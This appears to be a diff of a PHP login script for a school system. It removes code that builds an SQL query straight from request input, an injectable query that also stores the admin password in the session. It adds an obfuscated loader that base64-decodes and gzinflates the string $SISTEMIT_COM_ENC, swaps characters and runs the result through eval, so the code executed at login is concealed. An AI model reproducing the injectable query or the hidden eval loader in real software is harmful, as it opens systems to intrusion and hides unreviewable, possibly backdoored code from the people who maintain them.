@@ -1,34 +1,3 @@
-<?php 
-session_start(); require_once("kon.php");
-$username 	= $_REQUEST['username'];
-$password	= $_REQUEST['password'];
-
-	$query = mysqli_query($kon, "SELECT * FROM user WHERE username='$username' AND password = '$password'");
-	$cek  = mysqli_fetch_array($query);
-
-	if($cek > 0){
-		if($cek['level'] == 'Guru'){
-			$_SESSION['username'] = $username;
-			$_SESSION['id'] = $cek['id'];
-			$_SESSION['level'] = "Guru";
-			header("location:view/index");
-		}else if($cek['level'] == 'Siswa'){
-			$_SESSION['username'] = $username;
-			$_SESSION['id'] = $cek['id'];
-			$_SESSION['level'] = "Siswa";
-			header("location:view/index");
-		}else if($cek['level'] == 'Admin'){
-			$_SESSION['username'] = $username;
-			$_SESSION['password'] = $password;
-			$_SESSION['level'] = "Admin";
-			header("location:view/index");
-		}else if($cek['level'] == 'Karyawan'){
-			$_SESSION['username'] = $username;
-			$_SESSION['id'] = $cek['id'];
-			$_SESSION['level'] = "Karyawan";
-			header("location:view/index");
-		}
-	}else{
-		?><script>window.location="index"; </script><?php
-	}				
+<?php
+$SISTEMIT_COM_ENC = "3dS7qqtcEADg/sB5ibCLs7GIl5gYNrtIvCTejcvlrdmgkIAuRW00vtd5IBEsFAsLKwmcJN3/Cn85MPMtZoY1v399ABFYvCpaP6yu/vAa+/f776r3jePc9wdeDAz1cUPjiUUwkxeZeRyDCeAaTzZokjnVE+VAHpG37AUNOIZ2wXDWmG/VJZzo4sK3fU7Y8kKWIGgrxz+vmXpdh2U7cX0YDrQnPFQwL2hrIJZWDsBWww5sp6ZGCO+I2yNgdt2UYSzwo8H1Du6tUo1yuwvLZRxMKa5PvTMcU31R7Y4hLNss2pFSHHMGxe3AJvJ6o45OZRStzqSdNo3WMrbMdXO0mZNGr29Bg10NxuNirSkOCijHg0cJBAcJxpZYnMWnwYmZm19KgWtKgaTHvgwtlHtbI7q10+Ys6eZpGE3ZrJFqKnarCHBzL5VrdwRS9Zh6+SCcT0uWeeEUMl5+zSNJ78M6rkLLLrGYIzGGworwyHsxgsxdclSROFQP+yBW1B1Po05ssNRc9zsi9yfQlsbezRqpkZS81JdtY8r21PM7a11S/XxeD9y9rJa733pUlwe7RJkbbNiZbkf2PHkrXB4gxbVQwmZuYwc0xtfsXrA7dPW7wmnwOz0qeDRgeZ/07ca5YmJiYJrHHYrKsQzIYwMBNgEl91h0n6CiNliG5L37kHQ8su9xKPbJJleX87YlBYTh14tFyp57pnI3YeoFucWiYFTnZJeuslOLLHcuB3cVJbDcjGgX2+/dvWjZsyzVlGwZQFi8Tdlu9U2y66xuca9EcxUJqk/wtZzqBbmOudXXRzGn03cwd8t28zMtYTMtf1YgDon5ZGYXC0kmeSE9OyQCRzqb0XGG5Jg59qgHPJ3DxJ9Nws+9SAIB33MQmZYd0zZEsALIP+nQhConJM+YMPnemuuJh85evhBCMZNqDdOnzx1Tm0KJCjN6Ijfk4mg1GHotiCvOjyZ5cadWE7QoxJuH6dDqhfR7kCIqiCbLozRZqY+txWtJ+K6ncUiasUWF5fODmTOeyYDPKC+eNJ84OiFJ+5B8+pFUvH1OePsOevt3/fTyzeLtJxr98tVkevmxGr/9+PKqT9ExQCMMcZrzyV4GUDv6OOJgavuOgFIoaOySmCJI/Ciw/df7pxll1jM3UgmJfnrg2ed5OWXqhZCI5zz9kN9T6muGTi87aJznk/SyhwB6d0CYtXH5/l59fi2PGf3577reK/z8/PoAlm58r/4v92b19fvXPw==";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP="EADg/sB5ibCLs7GIl5gYNrtIvCTejcvlrdmgkIAuRW00vtd5IBEsFAsLKwmcJN3/Cn85MPMtZoY1v399ABFYvCpaP6yu/vAa+/f776r3jePc9wdeDAz1cUPjiUUwkxeZeRyDCeAaTzZokjnVE+VAHpG37AUNOIZ2wXDWmG/VJZzo4sK3fU7Y8kKWIGgrxz+vmXpdh2U7";
 ?>
